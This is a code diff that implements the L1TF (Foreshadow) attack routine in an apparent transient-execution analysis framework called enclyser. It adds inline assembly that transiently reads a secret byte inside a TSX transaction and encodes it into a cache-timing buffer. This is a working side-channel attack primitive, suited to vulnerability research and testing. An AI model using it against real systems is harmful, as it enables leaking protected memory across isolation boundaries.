@@ -31,7 +31,38 @@ static void l1des_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *atta
  */
 static void l1tf_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
 {
-    /** TODO */
+    uint64_t rdi, rsi, rdx, rcx, r8;
+
+    ASSERT((0 <= attack_spec->offset) && (attack_spec->offset < attaking_buffer->size));
+
+    rdi = (uint64_t)attack_spec->offset;     /** consistent during the process */
+    rsi = (uint64_t)attaking_buffer->buffer; /** consistent during the process */
+    rdx = (uint64_t)encoding_buffer->buffer; /** consistent during the process */
+    rcx = (uint64_t)CACHELINE_SIZE;          /** rcx = log2(rcx), consistent during the process */
+    r8 = (uint64_t)attaking_buffer->shadow;  /** consistent during the process */
+
+    switch (attack_spec->minor)
+    {
+    case ATTACK_MINOR_NONE:
+        break;
+    case ATTACK_MINOR_STABLE:
+        asm volatile(
+            "movq %4, %%r8\n"
+            "tzcnt %%rcx, %%rcx\n"  /** rcx = log2(CACHELINE_SIZE) */
+            "mfence\n"
+            "xbegin 1f\n"
+            "movzbq (%%rdi, %%rsi), %%rax\n"
+            "shl %%cl, %%rax\n"
+            "movzbq (%%rax, %%rdx), %%rax\n"
+            "xend\n"
+            "1:\n"
+            :
+            : "D"(rdi), "S"(rsi), "d"(rdx), "c"(rcx), "r"(r8)
+            :);
+        break;
+    default:
+        break;
+    }
 }
 
 /**
